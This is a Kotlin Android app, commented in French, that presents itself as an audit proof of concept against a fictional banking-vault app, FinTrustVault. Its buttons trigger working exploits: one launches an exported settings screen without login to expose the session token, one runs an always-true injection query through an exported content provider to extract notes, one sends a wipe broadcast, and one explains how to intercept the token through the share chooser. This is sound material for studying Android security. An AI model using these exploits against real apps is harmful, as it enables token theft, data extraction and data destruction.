package com.audit.probe

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

/**
 * AuditProbe — application d'audit (preuve de concept).
 * Toutes les manipulations ne ciblent que FinTrustVault, sur le même émulateur,
 * avec des données fictives. Un bouton par vulnérabilité.
 */
class MainActivity : AppCompatActivity() {
    private lateinit var out: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
        }
        layout.addView(TextView(this).apply {
            text = "AuditProbe — audit de FinTrustVault"; textSize = 20f
        })
        layout.addView(TextView(this).apply {
            text = "Cible : com.fintrust.vault, sur le même émulateur."; textSize = 14f
            setPadding(0, 8, 0, 8)
        })
        out = TextView(this).apply {
            text = "Choisissez une preuve de concept."; textSize = 15f; setPadding(0, 20, 0, 0)
        }

        fun add(label: String, action: () -> Unit) {
            layout.addView(Button(this).apply { text = label; setOnClickListener { action() } })
        }
        add("V1 — ouvrir SettingsActivity sans login") { exploiterV1() }
        add("V2 — extraire toutes les notes (injection)") { exploiterV2() }
        add("V3 — déclencher l'effacement (wipe)") { exploiterV3() }
        add("V4 — mode d'emploi de l'interception") {
            out.text = "V4 : depuis FinTrustVault, appuyez sur « Partager », " +
                "puis choisissez AuditProbe dans le sélecteur. " +
                "Le jeton de session s'affichera dans l'écran d'interception."
        }
        layout.addView(out)
        setContentView(ScrollView(this).apply { addView(layout) })
    }

    // V1 : lancer une Activity exportée sans authentification
    private fun exploiterV1() {
        try {
            val intent = Intent().setClassName(
                "com.fintrust.vault",
                "com.fintrust.vault.SettingsActivity"
            )
            startActivity(intent)
            out.text = "V1 → SettingsActivity lancée. Le jeton de session s'affiche sans connexion."
        } catch (e: Exception) {
            out.text = "V1 → BLOQUÉ : ${e.javaClass.simpleName} : ${e.message}"
        }
    }

    // V2 : interroger le provider exporté avec une clause toujours vraie
    private fun exploiterV2() {
        val res = try {
            val uri = Uri.parse("content://com.fintrust.vault.provider/notes")
            val cursor = contentResolver.query(uri, null, "1=1 OR 1=1", null, null)
            val lignes = mutableListOf<String>()
            cursor?.use {
                val i = it.getColumnIndex("contenu")
                while (it.moveToNext()) {
                    lignes.add(if (i >= 0) it.getString(i) else it.getString(0))
                }
            }
            if (lignes.isEmpty()) "Aucune donnée retournée (accès refusé)"
            else "Notes extraites :\n" + lignes.joinToString("\n")
        } catch (e: Exception) {
            "BLOQUÉ : ${e.javaClass.simpleName} : ${e.message}"
        }
        out.text = "V2 → $res"
    }

    // V3 : envoyer le broadcast que WipeReceiver écoute
    private fun exploiterV3() {
        try {
            val intent = Intent("com.fintrust.vault.ACTION_WIPE")
                .setPackage("com.fintrust.vault")
            sendBroadcast(intent)
            out.text = "V3 → broadcast ACTION_WIPE envoyé. Rouvrez FinTrustVault : les notes doivent avoir disparu."
        } catch (e: Exception) {
            out.text = "V3 → BLOQUÉ : ${e.javaClass.simpleName} : ${e.message}"
        }
    }
}
